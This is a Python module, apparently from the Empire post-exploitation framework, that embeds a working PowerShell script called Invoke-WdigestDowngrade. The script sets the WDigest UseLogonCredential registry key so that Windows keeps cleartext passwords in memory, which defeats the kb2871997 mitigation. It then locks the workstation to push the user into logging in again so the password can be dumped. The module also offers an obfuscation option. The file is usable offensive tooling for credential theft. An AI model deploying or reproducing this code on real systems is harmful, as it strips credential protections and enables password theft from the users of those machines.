from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-WdigestDowngrade',

            'Author': ['@harmj0y'],

            'Description': ("Sets wdigest on the machine to explicitly use "
                            "logon credentials. Counters kb2871997."),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'NoLock' : {
                'Description'   :   "Switch. Don't lock the workstation after registry change.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'Cleanup' : {
                'Description'   :   'Switch. Disable the registry key.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        script = """
function Invoke-LockWorkStation {
    # region define P/Invoke types dynamically
    #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
    #   thanks matt and chris :)
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
 
    $TypeBuilder = $ModuleBuilder.DefineType('Win32.User32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('User32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))
 
    # Define [Win32.User32]::LockWorkStation()
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('LockWorkStation',
        'User32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@(),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    
    $User32 = $TypeBuilder.CreateType()
    
    $Null = $User32::LockWorkStation()
}

function Invoke-WdigestDowngrade {
    <#
    .SYNOPSIS
    Explicitly sets Wdigest on a Windows 8.1/Server 2012 machine to use logon credentials.
    Locks the screen after so the user must retype their password.
    
    .PARAMETER NoLock
    Doesn't lock the screen after registry set.

    .PARAMETER Cleanup
    Removes the registry key to force UseLogonCredential.

    .LINK
    https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/

    #>
    [CmdletBinding()]
    Param (
        [Switch] $NoLock,
        [Switch] $Cleanup
    )

    if($Cleanup){
        try {
            Remove-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
            "Wdigest set to not use logoncredential."
        }
        catch {
            "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential not set"
        }
    }
    else{
        Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
        "Wdigest set to use logoncredential."

        if(-not $NoLock){
            Invoke-LockWorkStation
            "Workstation locked"
        }
    }
}
"""

        script += "Invoke-WdigestDowngrade"

        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
